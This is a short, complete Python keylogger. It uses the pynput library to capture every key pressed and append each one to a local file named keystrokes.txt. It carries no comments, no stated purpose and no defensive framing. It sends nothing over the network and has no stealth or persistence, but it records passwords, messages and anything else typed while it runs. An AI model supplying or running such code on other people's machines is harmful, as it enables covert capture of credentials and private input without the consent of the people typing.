from pynput import keyboard
import os

file_name = 'keystrokes.txt'

def on_press(key):
    try:
        current  = str(key.char)
    except AttributeError:
        current = str(key)
    with open(file_name, 'a') as f:
        f.write(current + '\n')

def on_release(key):
    pass

if __name__ == '__main__':
    if not os.path.exists(file_name):
        with open(file_name, 'w') as f:
            f.write('')
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
